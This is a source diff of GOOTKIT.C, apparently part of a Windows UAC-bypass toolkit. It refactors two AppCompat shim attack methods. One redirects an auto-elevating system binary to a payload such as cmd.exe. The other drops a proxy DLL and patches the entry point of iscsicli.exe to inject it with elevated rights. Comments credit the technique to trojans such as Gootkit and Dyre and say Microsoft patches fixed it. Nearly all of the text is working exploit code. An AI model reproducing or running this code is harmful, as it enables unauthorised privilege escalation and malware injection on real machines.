@@ -1,13 +1,13 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2017,
+*  (C) COPYRIGHT AUTHORS, 2014 - 2019,
 *  (C) MS FixIT Shim Patches revealed by Jon Erickson
 *
 *  TITLE:       GOOTKIT.C
 *
-*  VERSION:     2.78
+*  VERSION:     3.17
 *
-*  DATE:        30 July 2017
+*  DATE:        18 Mar 2019
 *
 *  Gootkit based AutoElevation using AppCompat.
 *
@@ -69,7 +69,7 @@ BOOL ucmRegisterAndRunTarget(
     _strcat(szSdbinstPath, SYSWOW64_DIR);
     _strcat(szSdbinstPath, SDBINST_EXE);
 #else
-    _strcpy(szSdbinstPath, g_ctx.szSystemDirectory);
+    _strcpy(szSdbinstPath, g_ctx->szSystemDirectory);
     _strcat(szSdbinstPath, SDBINST_EXE);
 #endif
 
@@ -91,7 +91,7 @@ BOOL ucmRegisterAndRunTarget(
         _strcpy(szCmd, USER_SHARED_DATA->NtSystemRoot);
         _strcat(szCmd, SYSWOW64_DIR);
 #else
-        _strcpy(szCmd, g_ctx.szSystemDirectory);
+        _strcpy(szCmd, g_ctx->szSystemDirectory);
 #endif
         _strcat(szCmd, lpTarget);
         bResult = supRunProcess(szCmd, NULL);
@@ -115,12 +115,14 @@ BOOL ucmRegisterAndRunTarget(
 * Initially used in BlackEnergy2 and Gootkit by mzH (alive-green).
 * Used in number of trojans (Win32/Dyre, WinNT/Cridex).
 *
+* Fixed in Windows 10 TH1, KB3045645/KB3048097 for everything else
+*
 */
-BOOL ucmShimRedirectEXE(
-    LPWSTR lpszPayloadEXE
+NTSTATUS ucmShimRedirectEXE(
+    _In_ LPWSTR lpszPayloadEXE
 )
 {
-    BOOL bResult = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     PDB hShimDb;
     GUID dbGUID, exeGUID;
     WCHAR szShimDbPath[MAX_PATH * 2];
@@ -131,24 +133,29 @@ BOOL ucmShimRedirectEXE(
     TAGID tidShim = 0;
     TAGID tidLib = 0;
 
-    if (lpszPayloadEXE == NULL)
-        return bResult;
+    if (lpszPayloadEXE == NULL) {
+        return STATUS_INVALID_PARAMETER;
+    }
 
     //
     // GUIDs are important, for both DATABASE and EXE file.
     // They used as shim identifiers and must be set.
     //
     if ((CoCreateGuid(&dbGUID) != S_OK) ||
-        (CoCreateGuid(&exeGUID) != S_OK)) return bResult;
+        (CoCreateGuid(&exeGUID) != S_OK))
+    {
+        return STATUS_INTERNAL_ERROR;
+    }
 
     RtlSecureZeroMemory(szShimDbPath, sizeof(szShimDbPath));
-    _strcpy(szShimDbPath, g_ctx.szTempDirectory);
+    _strcpy(szShimDbPath, g_ctx->szTempDirectory);
     _strcat(szShimDbPath, MYSTERIOUSCUTETHING);
     _strcat(szShimDbPath, L".sdb");
 
     hShimDb = SdbCreateDatabase(szShimDbPath, DOS_PATH);
-    if (hShimDb == NULL)
-        return bResult;
+    if (hShimDb == NULL) {
+        return STATUS_INTERNAL_ERROR;
+    }
 
     //write shim DB header
     tidDB = SdbBeginWriteListTag(hShimDb, TAG_DATABASE);
@@ -192,12 +199,15 @@ BOOL ucmShimRedirectEXE(
     }
     SdbCloseDatabaseWrite(hShimDb);
 
-    bResult = ucmRegisterAndRunTarget(
+    if (ucmRegisterAndRunTarget(
         szShimDbPath,
         CLICONFG_EXE,
-        FALSE);
+        FALSE))
+    {
+        MethodResult = STATUS_SUCCESS;
+    }
 
-    return bResult;
+    return MethodResult;
 }
 
 #ifndef _WIN64
@@ -210,13 +220,15 @@ BOOL ucmShimRedirectEXE(
 * Build, register shim patch database and execute target app with forced Entry Point Override.
 * Aside from UAC bypass this is also dll injection technique.
 *
+* Fixed in Windows 10 TH1, KB3045645/KB3048097 for everything else
+*
 */
-BOOL ucmShimPatch(
-    CONST PVOID ProxyDll,
-    DWORD ProxyDllSize
+NTSTATUS ucmShimPatch(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE, cond = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     PDB	 hpdb;
     GUID dbGUID, exeGUID;
 
@@ -231,17 +243,22 @@ BOOL ucmShimPatch(
     do {
 
         if ((CoCreateGuid(&dbGUID) != S_OK) ||
-            (CoCreateGuid(&exeGUID) != S_OK)) return bResult;
+            (CoCreateGuid(&exeGUID) != S_OK))
+        {
+            return STATUS_INTERNAL_ERROR;
+        }
 
         // drop Fubuki
         RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
         _strcat(szBuffer, L"r3.dll");
-        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
+        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {
+            MethodResult = STATUS_UNSUCCESSFUL;
             break;
+        }
 
         RtlSecureZeroMemory(szShimDbPath, sizeof(szShimDbPath));
-        _strcpy(szShimDbPath, g_ctx.szTempDirectory);
+        _strcpy(szShimDbPath, g_ctx->szTempDirectory);
         _strcat(szShimDbPath, INAZUMA_REV);
         _strcat(szShimDbPath, L".sdb");
         hpdb = SdbCreateDatabase(szShimDbPath, DOS_PATH);
@@ -272,11 +289,13 @@ BOOL ucmShimPatch(
         SdbWriteStringTag(hpdb, TAG_NAME, BINARYPATH_TAG);
 
         // query EP RVA for target
-        _strcpy(szBuffer, g_ctx.szSystemDirectory);
+        _strcpy(szBuffer, g_ctx->szSystemDirectory);
         _strcat(szBuffer, ISCSICLI_EXE);
         epRVA = supQueryEntryPointRVA(szBuffer);
-        if (epRVA == 0)
+        if (epRVA == 0) {
+            MethodResult = STATUS_ENTRYPOINT_NOT_FOUND;
             break;
+        }
 
         tmp = supHeapAlloc(32 * 1024);
         if (tmp != NULL) {
@@ -324,66 +343,16 @@ BOOL ucmShimPatch(
         SdbCloseDatabaseWrite(hpdb);
 
         // Register db and run target.
-        bResult = ucmRegisterAndRunTarget(
+        if (ucmRegisterAndRunTarget(
             szShimDbPath,
             ISCSICLI_EXE,
-            TRUE);
+            TRUE))
+        {
+            MethodResult = STATUS_SUCCESS;
+        }
 
-    } while (cond);
+    } while (FALSE);
 
-    return bResult;
+    return MethodResult;
 }
 #endif /* _WIN64 */
-
-/*
-* ucmAppcompatElevation
-*
-* Purpose:
-*
-* AutoElevation using Application Compatibility engine.
-*
-*/
-BOOL ucmAppcompatElevation(
-    UCM_METHOD Method,
-    CONST PVOID ProxyDll,
-    DWORD ProxyDllSize,
-    LPWSTR lpszPayloadEXE
-)
-{
-    BOOL    bCond = FALSE, bResult = FALSE;
-    WCHAR   szBuffer[MAX_PATH + 1];
-
-#ifdef _WIN64
-    UNREFERENCED_PARAMETER(ProxyDll);
-    UNREFERENCED_PARAMETER(ProxyDllSize);
-    UNREFERENCED_PARAMETER(lpszPayloadEXE);
-#endif
-
-    do {
-
-        //create and register shim with RedirectEXE, cmd.exe as payload
-        if (Method == UacMethodRedirectExe) {
-            if (lpszPayloadEXE == NULL) {
-                _strcpy_w(szBuffer, T_DEFAULT_CMD);
-                bResult = ucmShimRedirectEXE(szBuffer);
-                break;
-            }
-            else {
-                bResult = ucmShimRedirectEXE(lpszPayloadEXE);
-                break;
-            }
-        }
-        //create and register shim patch with fubuki as payload
-        if (Method == UacMethodShimPatch) {
-#ifndef _WIN64 
-            bResult = ucmShimPatch(ProxyDll, ProxyDllSize);
-#else
-            bResult = FALSE;
-            break;
-#endif
-    }
-
-} while (bCond);
-
-return bResult;
-}
